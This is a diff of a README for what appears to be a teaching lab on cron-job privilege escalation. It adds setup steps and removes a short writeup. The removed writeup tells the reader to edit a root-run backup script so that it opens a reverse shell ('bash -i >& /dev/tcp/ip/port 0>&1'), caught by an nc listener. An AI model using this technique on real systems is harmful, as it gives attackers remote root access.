@@ -1,10 +1,12 @@
-setup 
-git clone 
+## Lab Setup 
+
+```bash
+# 1. Clone the repository
+git clone https://github.com/iCxts/cronjoblab.git
+cd cronjoblab
+
+# 2. Run the setup script
 sudo ./setup_cron.sh
 
-lab writeup 
-cat /etc/cron.d/backup
-ls -l /opt/backup/task.sh
-edit tash.sh (use reverse shell)
-e.g. bash -i >& /dev/tcp/ip/port 0>&1
-with listener nc -nvlp 4444  
+# 3. Add the student user to the 'students' group
+sudo usermod -aG students <student-username>
